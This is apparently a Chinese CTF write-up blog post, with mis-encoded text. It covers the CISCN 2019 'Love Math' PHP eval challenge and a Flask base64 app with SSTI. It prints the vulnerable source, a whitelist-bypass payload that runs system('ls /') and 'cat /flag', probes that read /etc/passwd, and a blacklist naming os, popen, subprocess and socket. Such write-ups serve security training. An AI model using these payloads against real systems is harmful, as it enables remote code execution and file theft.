<h3 id="CISCN-2019-åˆèµ›-Love-Math"><a href="#CISCN-2019-åˆèµ›-Love-Math" class="headerlink" title="[CISCN 2019 åˆèµ›]Love Math"></a>[CISCN 2019 åˆèµ›]Love Math</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flag</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token comment">//ä¾‹å­ c=20-1</span>
    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span> <span class="token operator">&gt;=</span> <span class="token number">80</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"å¤ªé•¿äº†ä¸ä¼šç®—"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\t'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\r'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\n'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\''</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'"'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'`'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\['</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\]'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blackitem</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$blackitem</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/m'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token comment">//å¸¸ç”¨æ•°å­¦å‡½æ•°http://www.w3school.com.cn/php/php_ref_math.asp</span>
    <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'abs'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'acos'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'acosh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'asin'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'asinh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'atan2'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'atan'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'atanh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'base_convert'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'bindec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'ceil'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'cos'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'cosh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'decbin'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'dechex'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'decoct'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'deg2rad'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'exp'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'expm1'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'floor'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'fmod'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'getrandmax'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'hexdec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'hypot'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'is_finite'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'is_infinite'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'is_nan'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'lcg_value'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'log10'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'log1p'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'log'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'max'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'min'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mt_getrandmax'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mt_rand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mt_srand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'octdec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'pi'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'pow'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'rad2deg'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'rand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'round'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'sin'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'sinh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'sqrt'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'srand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'tan'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'tanh'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token variable">$used_funcs</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$used_funcs</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$func</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token comment">//å¸®ä½ ç®—å‡ºç­”æ¡ˆ</span>
    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'echo '</span><span class="token operator">.</span><span class="token variable">$content</span><span class="token operator">.</span><span class="token string single-quoted-string">';'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<pre class="line-numbers language-none"><code class="language-none">base_convert(37907361743, 10, 36)
base_convert æ˜¯ PHP ä¸­çš„ä¸€ä¸ªå‡½æ•°ï¼Œå…¶ä½œç”¨æ˜¯å°†ä¸€ä¸ªæ•°å­—ä»ä¸€ç§è¿›åˆ¶è½¬æ¢ä¸ºå¦ä¸€ç§è¿›åˆ¶ã€‚è¿™é‡Œ base_convert(37907361743, 10, 36) è¡¨ç¤ºæŠŠåè¿›åˆ¶æ•° 37907361743 è½¬æ¢ä¸º 36 è¿›åˆ¶çš„æ•°ï¼Œæœ€ç»ˆå¾—åˆ° "hex2bin"ã€‚åœ¨ 36 è¿›åˆ¶é‡Œï¼Œä½¿ç”¨çš„å­—ç¬¦é›†æ˜¯ 0 - 9 å’Œ a - zã€‚
2. dechex(1598506324)
dechex å‡½æ•°çš„åŠŸèƒ½æ˜¯æŠŠåè¿›åˆ¶æ•°è½¬æ¢ä¸ºåå…­è¿›åˆ¶æ•°ã€‚dechex(1598506324) ä¼šå°†åè¿›åˆ¶æ•° 1598506324 è½¬æ¢ä¸ºåå…­è¿›åˆ¶ï¼Œç»“æœæ˜¯ "5f474554"ã€‚
3. $pi = hex2bin("5f474554")
hex2bin å‡½æ•°çš„ä½œç”¨æ˜¯æŠŠåå…­è¿›åˆ¶å­—ç¬¦ä¸²è½¬æ¢ä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸²ã€‚hex2bin("5f474554") ä¼šå°†åå…­è¿›åˆ¶å­—ç¬¦ä¸² "5f474554" è½¬æ¢ä¸ºå¯¹åº”çš„äºŒè¿›åˆ¶å­—ç¬¦ä¸²ï¼Œå®é™…ä¸Šå¾—åˆ°çš„æ˜¯ "_GET"ï¼Œç„¶åå°†å…¶èµ‹å€¼ç»™å˜é‡ $piã€‚
4. ($$pi){pi}(($$pi){abs})
åœ¨ PHP ä¸­ï¼Œ$$ æ˜¯å¯å˜å˜é‡çš„è¯­æ³•ã€‚å¯å˜å˜é‡å…è®¸ä½ åŠ¨æ€åœ°è®¾ç½®å’Œä½¿ç”¨å˜é‡åã€‚å› ä¸º $pi çš„å€¼æ˜¯ "_GET"ï¼Œæ‰€ä»¥ $$pi å°±ç­‰åŒäº $_GETã€‚
{} åœ¨æŸäº›æƒ…å†µä¸‹å¯ä»¥æ›¿ä»£ [] æ¥è®¿é—®æ•°ç»„å…ƒç´ ã€‚æ‰€ä»¥ ($$pi){pi} å°±ç›¸å½“äº $_GET['pi']ï¼Œ($$pi){abs} ç›¸å½“äº $_GET['abs']ã€‚
æ•´ä½“ ($$pi){pi}(($$pi){abs}) å®é™…ä¸Šå°±æ˜¯æ‰§è¡Œ $_GET['pi']($_GET['abs'])ï¼Œä¹Ÿå°±æ˜¯è°ƒç”¨é€šè¿‡ GET è¯·æ±‚ä¼ é€’è¿›æ¥çš„ pi å‚æ•°æ‰€ä»£è¡¨çš„å‡½æ•°ï¼Œå¹¶ä¸”å°† GET è¯·æ±‚ä¼ é€’è¿›æ¥çš„ abs å‚æ•°ä½œä¸ºè¯¥å‡½æ•°çš„å‚æ•°ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote>
<pre class="line-numbers language-none"><code class="language-none">hex2bin("5f474554")
=&gt;base_convert(37907361743, 10, 36)(dechex(1598506324))=$pi
system("ls /")
=&gt;($$pi){tan}(($$pi){sin})
?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){sin})&amp;pi=system&amp;sin=ls /
?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){sin})&amp;pi=system&amp;sin=cat /flag
flag{d0162c99-47e5-4483-9828-1feeae7b7fc6}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/4efde3cec38bc6320055270b9552902a.png"></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_35782055/article/details/129126825">å…³äºctfä¸­flaskç®—pinæ€»ç»“_ctf:flask-CSDNåšå®¢</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/1feb6d1e2469a6a3171a1f004e7e524f.png"></p>
<pre class="line-numbers language-none"><code class="language-none">{{7*7}}-&gt;no
{{7+7}}-&gt;14
è¯•äº†è¯•ï¼Œpopenï¼Œ*ä¸èƒ½

open('/etc/passwd/')<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ç»™chefç¾åŒ–ä¸€ä¸‹</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template_string<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> request<span class="token punctuation">,</span> flash<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> url_for
<span class="token keyword">from</span> flask_wtf <span class="token keyword">import</span> FlaskForm
<span class="token keyword">from</span> wtforms <span class="token keyword">import</span> StringField<span class="token punctuation">,</span> SubmitField
<span class="token keyword">from</span> wtforms<span class="token punctuation">.</span>validators <span class="token keyword">import</span> DataRequired
<span class="token keyword">from</span> flask_bootstrap <span class="token keyword">import</span> Bootstrap
<span class="token keyword">import</span> base64

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SECRET_KEY'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'s_e_c_r_e_t_k_e_y'</span>
bootstrap <span class="token operator">=</span> Bootstrap<span class="token punctuation">(</span>app<span class="token punctuation">)</span>


<span class="token keyword">class</span> <span class="token class-name">NameForm</span><span class="token punctuation">(</span>FlaskForm<span class="token punctuation">)</span><span class="token punctuation">:</span>
    text <span class="token operator">=</span> StringField<span class="token punctuation">(</span><span class="token string">'BASE64åŠ å¯†'</span><span class="token punctuation">,</span> validators<span class="token operator">=</span><span class="token punctuation">[</span>DataRequired<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    submit <span class="token operator">=</span> SubmitField<span class="token punctuation">(</span><span class="token string">'æäº¤'</span><span class="token punctuation">)</span>


<span class="token keyword">class</span> <span class="token class-name">NameForm1</span><span class="token punctuation">(</span>FlaskForm<span class="token punctuation">)</span><span class="token punctuation">:</span>
    text <span class="token operator">=</span> StringField<span class="token punctuation">(</span><span class="token string">'BASE64è§£å¯†'</span><span class="token punctuation">,</span> validators<span class="token operator">=</span><span class="token punctuation">[</span>DataRequired<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    submit <span class="token operator">=</span> SubmitField<span class="token punctuation">(</span><span class="token string">'æäº¤'</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span>str_val<span class="token punctuation">)</span><span class="token punctuation">:</span>
    black_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"flag"</span><span class="token punctuation">,</span> <span class="token string">"os"</span><span class="token punctuation">,</span> <span class="token string">"system"</span><span class="token punctuation">,</span> <span class="token string">"popen"</span><span class="token punctuation">,</span> <span class="token string">"import"</span><span class="token punctuation">,</span> <span class="token string">"eval"</span><span class="token punctuation">,</span> <span class="token string">"chr"</span><span class="token punctuation">,</span> <span class="token string">"request"</span><span class="token punctuation">,</span> <span class="token string">"subprocess"</span><span class="token punctuation">,</span> <span class="token string">"commands"</span><span class="token punctuation">,</span> <span class="token string">"socket"</span><span class="token punctuation">,</span>
                  <span class="token string">"hex"</span><span class="token punctuation">,</span> <span class="token string">"base64"</span><span class="token punctuation">,</span> <span class="token string">"*"</span><span class="token punctuation">,</span> <span class="token string">"?"</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> x <span class="token keyword">in</span> black_list<span class="token punctuation">:</span>
        <span class="token keyword">if</span> x <span class="token keyword">in</span> str_val<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token number">1</span>
    <span class="token keyword">return</span> <span class="token number">0</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/hint'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">hint</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    txt <span class="token operator">=</span> <span class="token string">"å¤±è´¥ä¹ƒæˆåŠŸä¹‹æ¯ï¼ï¼"</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"hint.html"</span><span class="token punctuation">,</span> txt<span class="token operator">=</span>txt<span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">encode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'text'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        text <span class="token operator">=</span> request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"text"</span><span class="token punctuation">)</span>
        text_encoded <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        tmp <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"ç»“æœ :</span><span class="token interpolation"><span class="token punctuation">{</span>text_encoded<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">"</span></span>
        flash<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span>
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'encode'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        form <span class="token operator">=</span> NameForm<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"index.html"</span><span class="token punctuation">,</span> form<span class="token operator">=</span>form<span class="token punctuation">,</span> method<span class="token operator">=</span><span class="token string">"åŠ å¯†"</span><span class="token punctuation">,</span> img<span class="token operator">=</span><span class="token string">"flask.png"</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/decode'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">decode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'text'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        text <span class="token operator">=</span> request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"text"</span><span class="token punctuation">)</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            text_decoded <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            tmp <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"ç»“æœ ï¼š </span><span class="token interpolation"><span class="token punctuation">{</span>text_decoded<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">"</span></span>
            <span class="token keyword">if</span> waf<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">:</span>
                flash<span class="token punctuation">(</span><span class="token string">"no no no !!"</span><span class="token punctuation">)</span>
                <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'decode'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            flash<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span>
        <span class="token keyword">except</span> base64<span class="token punctuation">.</span>binascii<span class="token punctuation">.</span>Error<span class="token punctuation">:</span>
            flash<span class="token punctuation">(</span><span class="token string">"è¾“å…¥çš„ä¸æ˜¯æœ‰æ•ˆçš„ Base64 ç¼–ç å­—ç¬¦ä¸²"</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'decode'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        form <span class="token operator">=</span> NameForm1<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"index.html"</span><span class="token punctuation">,</span> form<span class="token operator">=</span>form<span class="token punctuation">,</span> method<span class="token operator">=</span><span class="token string">"è§£å¯†"</span><span class="token punctuation">,</span> img<span class="token operator">=</span><span class="token string">"flask1.png"</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/&lt;name&gt;'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">not_found</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"404.html"</span><span class="token punctuation">,</span> name<span class="token operator">=</span>name<span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        æ–‡ç« ä½œè€…:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">q1n9</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        æ–‡ç« é“¾æ¥:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://lingqing777.github.io/2025/01/25/di-yi-ye/">https://lingqing777.github.io/2025/01/25/di-yi-ye/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        ç‰ˆæƒå£°æ˜:
                    </i>
                </span>
                <span class="reprint-info">
                    æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ¥å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜æ¥æº
                    <a href="/about" target="_blank">q1n9</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>å¤åˆ¶æˆåŠŸï¼Œè¯·éµå¾ªæœ¬æ–‡çš„è½¬è½½è§„åˆ™</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">æŸ¥çœ‹</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/ctf/">
                                    <span class="chip bg-color">ctf</span>
                                </a>
                            
                                <a href="/tags/wp/">
                                    <span class="chip bg-color">wp</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>å¾®ä¿¡æ‰«ä¸€æ‰«å³å¯åˆ†äº«ï¼</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
        </div>
    </div>

    

    

    

    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;ä¸Šä¸€ç¯‡</div>
            <div class="card">
                <a href="/2025/01/30/zuo-ye/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="å…¶ä»–é¢˜1ï¼ˆé˜Ÿï¼‰">
                        
                        <span class="card-title">å…¶ä»–é¢˜1ï¼ˆé˜Ÿï¼‰</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2025-01-30
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-user fa-fw"></i>
                            q1n9
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/ctf/">
                        <span class="chip bg-color">ctf</span>
                    </a>
                    
                    <a href="/tags/wp/">
                        <span class="chip bg-color">wp</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                æœ¬ç¯‡&nbsp;<i class="far fa-dot-circle"></i>
            </div>
            <div class="card">
                <a href="/2025/01/25/di-yi-ye/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="buuctf">
                        
                        <span class="card-title">buuctf</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2025-01-25
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-user fa-fw"></i>
                            q1n9
                            
                        </span>
                    </div>
                </div>

                
                <div class="card-action article-tags">
                    
                    <a href="/tags/ctf/">
                        <span class="chip bg-color">ctf</span>
                    </a>
                    
                    <a href="/tags/wp/">
                        <span class="chip bg-color">wp</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>



<!-- ä»£ç å—åŠŸèƒ½ä¾èµ– -->
